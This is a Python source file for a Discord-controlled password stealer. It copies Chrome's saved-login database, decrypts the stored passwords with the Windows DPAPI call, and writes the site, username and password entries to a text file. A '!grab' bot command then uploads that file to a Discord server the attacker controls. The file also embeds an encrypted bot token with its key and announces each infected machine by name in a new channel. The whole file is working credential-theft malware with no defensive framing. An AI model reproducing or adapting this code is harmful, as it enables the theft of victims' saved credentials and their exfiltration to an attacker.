import os
import os.path as op
import shutil
import smtplib
import win32crypt
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formatdate
from shutil import copyfile
from sqlite3 import connect
import discord
import subprocess
from discord.ext import commands
from cryptography.fernet import Fernet
import platform  # Add this import statement

# Decrypting the token

# Replace with the encryption key you generated (it must be a bytes object)
key = b"XNVMkRPc1qP4Bq9C_OXAtYWD54rpUtJNpO_PICvFLII="  # Replace with your actual key
cipher_suite = Fernet(key)

# Replace with the encrypted token you generated
encrypted_token = b"gAAAAABouGj2ioU6r5nWwx4MPC42YD4zvPVqYfFYKmRELhCwPu4a4PCam5O7xzVMgY4QdSJSnUgcuVfygaO-M4X__OnuC2Qw7H_hDhqdWXgi4-HRTorljLeo5EGJyMXOQnmc0ktWi9jIFQNKHeheNBEi5UAFY6BrHI9cX4y7YHB10Clk6u-RpG0="  # Replace with your actual encrypted token

# Decrypt the token
TOKEN = cipher_suite.decrypt(encrypted_token).decode()

# Set up the bot
GUILD_ID = 1412825105817538563  # Replace this with your actual Guild ID
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# Directory to download files to
DOWNLOAD_DIR = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Discord\\"

# Ensure the download directory exists
if not os.path.exists(DOWNLOAD_DIR):
    os.makedirs(DOWNLOAD_DIR)

# Helper function to create or get the user's channel
async def get_or_create_channel(ctx, user_name):
    guild = bot.get_guild(GUILD_ID)  # Use the specific guild by ID
    # Check if a channel with the name already exists
    channel = discord.utils.get(guild.text_channels, name=user_name.lower())
    if not channel:
        # If the channel doesn't exist, create it
        channel = await guild.create_text_channel(user_name)
    return channel

# Function to extract passwords from Chrome
def getPass():
    env = os.getenv("LOCALAPPDATA")
    destination = "output.txt"

    path = env + "\\Google\\Chrome\\User Data\\Default\\Login Data"
    path2 = env + "\\Google\\Chrome\\User Data\\Default\\Login2"
    path = path.strip()
    path2 = path2.strip()

    try:
        copyfile(path, path2)
    except:
        pass
    conn = connect(path2)
    cursor = conn.cursor()
    cursor.execute(
        'SELECT action_url, username_value, password_value FROM logins')
    if os.path.exists(destination):
        os.remove(destination)
    sites = []
    for raw in cursor.fetchall():
        try:
            if raw[0] not in sites:
                if os.path.exists(destination):
                    with open(destination, "a") as password:
                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
                else:
                    with open(destination, "a") as password:
                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
                sites.append(raw[0])
        except:
            continue
    conn.close()
    return 0

# Command to grab and send passwords
@bot.command()
async def grab(ctx):
    # Check if the command is executed in the correct channel
    if ctx.channel.name != platform.node().lower():
        await ctx.send("This command can only be used in the channel corresponding to this device.")
        return

    # Extract passwords
    getPass()

    # Send the output.txt file as an attachment
    file_path = "output.txt"
    if os.path.exists(file_path):
        await ctx.send(file=discord.File(file_path))
    else:
        await ctx.send("No passwords found or an error occurred during extraction.")

# On bot startup: Check and create the channel, ping @everyone in the corresponding channel
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

    # Get the desktop name or username to create the channel
    desktop_name = platform.node()  # This is the name of the PC
    channel_name = desktop_name or os.getlogin()  # Default to the user’s login name if desktop name is not found

    # Fetch the guild (server) by ID and the channel
    guild = bot.get_guild(GUILD_ID)  # Get the specific guild by ID
    if not guild:
        print(f"Guild with ID {GUILD_ID} not found!")
        return

    channel = await get_or_create_channel(guild, channel_name)

    # Send a "ping" message to indicate the bot is online
    await channel.send(f"@everyone The bot is now online and active on {desktop_name}.")

    print(f"Bot is online. Pinged channel: {channel.name}")

# Run the bot
def run_bot():
    print("Starting the bot...")
    bot.run(TOKEN)

if __name__ == "__main__":
    run_bot()
